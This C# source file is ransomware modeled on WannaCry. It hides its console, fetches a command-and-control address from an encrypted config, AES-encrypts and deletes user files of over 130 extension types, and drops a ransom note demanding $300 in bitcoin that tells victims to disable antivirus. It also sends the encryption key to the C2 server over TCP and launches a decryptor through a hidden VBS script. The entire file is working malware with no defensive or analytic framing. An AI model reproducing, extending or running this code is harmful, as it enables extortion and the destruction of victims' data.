using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace taskse
{ 
    struct Client
    {
        public string client_id;
        public bool connection_successful;
    }

    struct Encryption
    {
        public string encrypt_key;
        public string encrypt_path;
        public List<string> encrypt_extension;
        public byte[] encrypt_iv;
    }

    struct Server
    {
        public string server_ip;
        public string server_key_aes;
        public string server_key_rsa;
        public int server_port;
    }

    class Program
    {
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        private static extern bool ZeroMemory(IntPtr Destination, int Length);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_HIDE = 0;
        private static readonly string FILE_NAME_SERVER_INFO = "b.wncry";
        private static readonly string FILE_KEY_SERVER_INFO = "GLD34QaGHRdsR2ws";
        private static readonly string FILE_NAME_CLIENT_INFO = "c.wncry";
        private static readonly string FILE_KEY_CLIENT_INFO = "GLD34QaGHRdsR2ws";
        private static readonly string FILE_NAME_FDECRYPT_INFO = "s.wncry";
        private static readonly string FILE_KEY_FDECRYPT_INFO = "GLD34QaGHRdsR2ws";
        private static readonly string FILE_NAME_TEMP_INFO = "t.wncry";
        private static readonly string FILE_NAME_PATH_INFO = "p.wncry";
        private static readonly string FILE_KEY_PATH_INFO = "GLD34QaGHRdsR2ws";
        private static int FREE_DECRYPT_LEN_CHECKER = 0;
        private static List<string> FREE_DECRYPT_FILE_LIST = new List<string>();
        private static List<string> CREATE_DIRECTORY_ALL_LIST = new List<string>();
        private static string FREE_DECRYPT_AES_KEY = "";
        private static string WRITE_DECRYPT_TEXT_FILE = "Q:  What's wrong with my files?\r\n" +
                                             "\r\n" +
                                             "A:  Ooops, your important files are encrypted. It means you will not be able to access them anymore until they are decrypted.\r\n" +
                                             "    If you follow our instructions, we guarantee that you can decrypt all your files quickly and safely!\r\n" +
                                             "    Let's start decrypting!\r\n" +
                                             "\r\n" +
                                             "Q:  What do I do?\r\n" +
                                             "\r\n" +
                                             "A:  First, you need to pay service fees for the decryption.\r\n" +
                                             "    Please send $300 worth of bitcoin to this bitcoin address: 1EsFWAEu64mN8v35f6fFhk189eiGJoTLjQ\r\n" +
                                             "\r\n" +
                                             "    Next, please find an application file named \"@WanaDecryptor@.exe\". It is the decrypt software.\r\n" +
                                             "    Run and follow the instructions! (You may need to disable your antivirus for a while.)\r\n" +
                                             "    \r\n" +
                                             "Q:  How can I trust?\r\n" +
                                             "\r\n" +
                                             "A:  Don't worry about decryption.\r\n" +
                                             "    We will decrypt your files surely because nobody will trust us if we cheat users.\r\n" +
                                             "    \r\n" +
                                             "\r\n" +
                                             "";
    
        private static string Generate_Client_ID()
        {
            Guid guid = Guid.NewGuid();
            return guid.ToString();
        }

        private static string Generate_Random_Text(int strLen)
        {
            int rnum = 0;
            int i, j;
            string ranStr = null;
            System.Random ranNum = new System.Random();
            for (i = 0; i <= strLen; i++)
            {
                for (j = 0; j <= 122; j++)
                {
                    rnum = ranNum.Next(48, 123);
                    if (rnum >= 48 && rnum <= 122 && (rnum <= 57 || rnum >= 65) && (rnum <= 90 || rnum >= 97))
                        break;
                }
                ranStr += Convert.ToChar(rnum);
            }
            return ranStr;
        }

        private static string Text_AES_Encrypt(string str, string key, byte[] iv)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = iv;
            var encrypt = aes.CreateEncryptor(aes.Key, aes.IV);
            byte[] xBuff = null;
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, encrypt, CryptoStreamMode.Write))
                {
                    byte[] xXml = Encoding.UTF8.GetBytes(str);
                    cs.Write(xXml, 0, xXml.Length);
                }
                xBuff = ms.ToArray();
            }
            return Convert.ToBase64String(xBuff);
        }

        private static string Text_AES_Decrypt(string str, string key, byte[] iv)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = iv;
            var decrypt = aes.CreateDecryptor();
            byte[] xBuff = null;
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, decrypt, CryptoStreamMode.Write))
                {
                    byte[] xXml = Convert.FromBase64String(str);
                    cs.Write(xXml, 0, xXml.Length);
                }

                xBuff = ms.ToArray();
            }
            return Encoding.UTF8.GetString(xBuff);
        }

        private static string Text_RSA_Encrypt(string str, string key)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.FromXmlString(key);
            byte[] inbuf = (new UTF8Encoding()).GetBytes(str);
            byte[] encbuf = rsa.Encrypt(inbuf, false);
            return System.Convert.ToBase64String(encbuf);
        }

        private static byte[] Generate_Random_Salt()
        {
            byte[] data = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                for (int i = 0; i < 10; i++) rng.GetBytes(data);
            return data;
        }

        private static void File_AES_Encrypt(string inputFile, string outputFile, string key, byte[] iv)
        {
            byte[] salt = Generate_Random_Salt();
            FileStream fsCrypt = new FileStream(outputFile, FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(key);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;
            AES.Key = Encoding.UTF8.GetBytes(key);
            AES.IV = iv;
            AES.Mode = CipherMode.CFB;
            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            byte[] buffer = new byte[1048576];
            int read;
            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }
                fsIn.Close();
            }
            catch (Exception) { }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        private static void Directory_All_FileName(string folderName, List<string> extension, string key, byte[] iv)
        {
            try
            {
                System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(folderName);
                foreach (System.IO.FileInfo f in di.GetFiles())
                {
                    foreach (string extension_check in extension)
                    {
                        if (f.Extension.ToLower().CompareTo(extension_check) == 0)
                        {
                            try
                            {
                                string strInFileName = di.FullName + "\\" + f.Name;
                                if (FREE_DECRYPT_LEN_CHECKER >= 3)
                                    File_AES_Encrypt(strInFileName, strInFileName + ".wnry", key, iv);
                                else
                                {
                                    FREE_DECRYPT_LEN_CHECKER++;
                                    File_AES_Encrypt(strInFileName, strInFileName + ".wnry", FREE_DECRYPT_AES_KEY, iv);
                                    var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(strInFileName);
                                    FREE_DECRYPT_FILE_LIST.Add(System.Convert.ToBase64String(plainTextBytes));
                                }
                                File.Delete(strInFileName);
                                break;
                            }
                            catch (Exception) { }
                        }
                    }
                }
                foreach (System.IO.DirectoryInfo sd in di.GetDirectories())
                {
                    CREATE_DIRECTORY_ALL_LIST.Add(sd.FullName);
                    Directory_All_FileName(sd.FullName, extension, key, iv);
                }

            }
            catch (Exception) {}
        }

        private static Dictionary<string, string> server_info(string WANNACRY_MAIN_SERVER_INFO_URL, string KEY_1, string KEY_2)
        {
            string url = WANNACRY_MAIN_SERVER_INFO_URL;
            string Data = null;
            WebRequest request = null;
            WebResponse response = null;
            Stream resStream = null;
            StreamReader resReader = null;
            try
            {
                string uriString = url;
                request = WebRequest.Create(uriString.Trim());
                response = request.GetResponse();
                resStream = response.GetResponseStream();
                resReader = new StreamReader(resStream);
                string resString = resReader.ReadToEnd();
                Data = resString;
            }
            catch (Exception) { return new Dictionary<string, string>() { { "IP", null }, { "PORT", null } }; }
            finally { if (resReader != null) resReader.Close(); if (response != null) response.Close(); }
            string ip = Text_AES_Decrypt(Data.Split(new string[] { "&" }, StringSplitOptions.None)[0], KEY_1, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 });
            string port = Text_AES_Decrypt(Data.Split(new string[] { "&" }, StringSplitOptions.None)[1], KEY_2, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 });
            return new Dictionary<string, string>() { { "IP", ip }, { "PORT", port } };
        }

        public static string Connection(string ip, int port, string command)
        {
            NetworkStream NS = null;
            StreamReader SR = null;
            StreamWriter SW = null;
            TcpClient client = null;
            try
            {
                client = new TcpClient(ip, port);
                NS = client.GetStream();
                SR = new StreamReader(NS, Encoding.UTF8);
                SW = new StreamWriter(NS, Encoding.UTF8);
                string SendMessage = string.Empty;
                string GetMessage = string.Empty;
                SendMessage = command;
                SW.WriteLine(SendMessage);
                SW.Flush();
                GetMessage = SR.ReadLine();
                return GetMessage;
            }
            catch (Exception) { return null; }
            finally
            {
                if (SW != null) SW.Close();
                if (SR != null) SR.Close();
                if (client != null) client.Close();
            }
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                Encryption encryption;
                Client client;
                Server server;
                string WANNACRY_MAIN_SERVER_INFO_URL = "";
                string WANNACRY_MAIN_SERVER_IP_AES_KEY = "";
                string WANNACRY_MAIN_SERVER_PORT_AES_KEY = "";
                try
                {
                    string TEMP_DECRYPTOR_INFO_FILE = Text_AES_Decrypt(File.ReadAllText(FILE_NAME_SERVER_INFO), FILE_KEY_SERVER_INFO, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 });
                    WANNACRY_MAIN_SERVER_INFO_URL = TEMP_DECRYPTOR_INFO_FILE.Split('+')[0];
                    WANNACRY_MAIN_SERVER_IP_AES_KEY = TEMP_DECRYPTOR_INFO_FILE.Split('+')[1];
                    WANNACRY_MAIN_SERVER_PORT_AES_KEY = TEMP_DECRYPTOR_INFO_FILE.Split('+')[2];
                }
                catch (Exception) { }
                Dictionary<string, string> get_server_info = server_info(
                                           WANNACRY_MAIN_SERVER_INFO_URL,
                                           WANNACRY_MAIN_SERVER_IP_AES_KEY,
                                           WANNACRY_MAIN_SERVER_PORT_AES_KEY);
                server.server_ip = get_server_info["IP"];
                server.server_port = int.Parse(get_server_info["PORT"]);
                server.server_key_rsa = Text_AES_Decrypt(File.ReadAllText("e.wncry"), "GLD34QaGHRdsR2ws", new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 }).Split(new string[] { "<--TEXT_2095-->" }, StringSplitOptions.None)[0];
                server.server_key_aes = Generate_Random_Text(15);
                client.client_id = Generate_Client_ID();
                client.connection_successful = true;
                FREE_DECRYPT_AES_KEY = Generate_Random_Text(15);
                encryption.encrypt_key = Generate_Random_Text(15);
                encryption.encrypt_iv = new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 };
                encryption.encrypt_path = Text_AES_Decrypt(File.ReadAllText(FILE_NAME_PATH_INFO), FILE_KEY_PATH_INFO, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 });
                encryption.encrypt_extension = new List<string>() {
                    ".hwp", ".ppt", ".pptx", ".show", ".xls", ".xlsx", ".cell", ".eml",
                    ".doc", ".docx", ".pdf", ".txt", ".log", ".html", ".js", ".ico",
                    ".vbs", ".bat", ".cmd", ".sh", ".java", ".class", ".cs", ".m3u",
                    ".xaml", ".fxml", ".xml", ".cpp", ".h", ".php", ".jsp", ".m4u",
                    ".asp", ".c", ".htm", ".png", ".bmp", ".jpg", ".jpeg", ".dch",
                    ".psd", ".pic", ".raw", ".tiff", ".ai", ".svg", ".eps", ".lay6",
                    ".tga", ".avi", ".flv", ".mkv", ".mov", ".mp3", ".mp4", ".odb",
                    ".waw", ".wma", ".ts", ".tp", ".ttf", ".bak", ".bck", "mdb", ".dbf",
                    ".bac", ".zip", ".alz", ".jar", ".rar", ".ini", ".inf", ".accdb",
                    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".sqlitedb",
                    ".odt", ".ott", ".sxw", ".uot", ".3ds", ".max", ".3dm", ".sqlite3",
                    ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".sql",
                    ".odp", ".otp", ".vb", ".pas", ".asm", ".pl", ".ps1", ".suo",
                    ".sln", ".rb", ".swf", ".fla", ".mpg", ".vob", ".mpeg", ".3gp",
                    ".3g2", ".mid", ".tif", ".cgm", ".iso", ".7z", ".gz", ".tgz",
                    ".tar", ".tbk", ".bz2", ".paq", ".123", ".csv", ".rtf", ".db",
                    ".docm", ".docb", ".xlsm", ".vcd", ".backup", ".nef", ".djvu"
                };
                Directory_All_FileName(encryption.encrypt_path, encryption.encrypt_extension, encryption.encrypt_key, encryption.encrypt_iv);
                try
                {
                    File.WriteAllText(FILE_NAME_CLIENT_INFO, Text_AES_Encrypt(client.client_id, FILE_KEY_CLIENT_INFO, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 }) + Text_AES_Decrypt(File.ReadAllText("e.wncry"), "GLD34QaGHRdsR2ws", new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 }).Split(new string[] { "<--TEXT_2095-->" }, StringSplitOptions.None)[1]);
                }
                catch (Exception) { }

                try
                {
                    foreach (string s in CREATE_DIRECTORY_ALL_LIST)
                    {
                        File.WriteAllText(s + "\\@Please_Read_Me@.txt", WRITE_DECRYPT_TEXT_FILE);
                    }
                }
                catch (Exception) { }

                string Write_FD_File = "";
                foreach (string temp in FREE_DECRYPT_FILE_LIST)
                {
                    if (Write_FD_File.Equals("")) Write_FD_File = temp;
                    else Write_FD_File = Write_FD_File + ":" + temp;
                }
                var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(FREE_DECRYPT_AES_KEY);
                Write_FD_File = Write_FD_File + "|" + System.Convert.ToBase64String(plainTextBytes);
                plainTextBytes = System.Text.Encoding.UTF8.GetBytes("false");
                Write_FD_File = Write_FD_File + "|" + System.Convert.ToBase64String(plainTextBytes);
                File.WriteAllText(FILE_NAME_FDECRYPT_INFO, Text_AES_Encrypt(Write_FD_File, FILE_KEY_FDECRYPT_INFO, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 }));
                string connection_result;
                string connection_command;
                string dateTime = "";
                dateTime = DateTime.Now.ToString("yyyy/MM/dd_HH/mm/ss").Replace("-", "/");
                connection_command = "[RSA]" + Text_RSA_Encrypt(client.client_id + "&" + server.server_key_aes, server.server_key_rsa);
                connection_result = Connection(server.server_ip, server.server_port, connection_command);
                if (connection_result == null)
                {
                    string write_temp = Text_RSA_Encrypt(client.client_id + "&" + encryption.encrypt_key + "&" + dateTime, server.server_key_rsa);
                    File.WriteAllText(FILE_NAME_TEMP_INFO, write_temp);
                    Environment.Exit(0);
                }
                else
                {
                    if (connection_result.Equals("SSL_KEY_SETTING_SUCCESSFUL")) client.connection_successful = true;
                    else client.connection_successful = false;

                    if (client.connection_successful == true)
                    {
                        connection_command = "[AES]" + Text_AES_Encrypt("CREATE_CLIENT_INFO&" + encryption.encrypt_key + "&" + dateTime, server.server_key_aes, new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 }) + "&" + client.client_id;
                        connection_result = Connection(server.server_ip, server.server_port, connection_command);
                        if (connection_result == null) client.connection_successful = false;
                        else if (!connection_result.Equals("CREATE_CLIENT_INFO_SUCCESSFUL")) client.connection_successful = false;
                    }
                    if (!(client.connection_successful == true))
                    {
                        string write_temp = Text_RSA_Encrypt(client.client_id + "&" + encryption.encrypt_key + "&" + dateTime, server.server_key_rsa);
                        File.WriteAllText(FILE_NAME_TEMP_INFO, write_temp);
                        Environment.Exit(0);
                    }
                    else
                    {
                        Thread th = new Thread(delegate () {
                            File.WriteAllText("run.vbs", "Set WinScriptHost = CreateObject( \"WScript.shell\" )\r\nWinScriptHost.Run Chr(34) & \"@WanaDecryptor@.exe\" & Chr(34), 0\r\nSet WinScriptHost = Nothing");
                            System.Diagnostics.ProcessStartInfo pri = new System.Diagnostics.ProcessStartInfo();
                            System.Diagnostics.Process pro = new System.Diagnostics.Process();
                            pri.FileName = "cmd.exe";
                            pri.CreateNoWindow = true;
                            pri.UseShellExecute = false;
                            pri.RedirectStandardInput = true;
                            pri.RedirectStandardOutput = true;
                            pri.RedirectStandardError = true;
                            pro.StartInfo = pri;
                            pro.Start();
                            pro.StandardInput.Write(@"run.vbs" + Environment.NewLine);
                            pro.StandardInput.Close();
                            pro.WaitForExit();
                            pro.Close();
                            Environment.Exit(0);
                        });
                        th.Start();
                    }
                }
            }
            catch (Exception) { Environment.Exit(0); }
        }   
    }
}
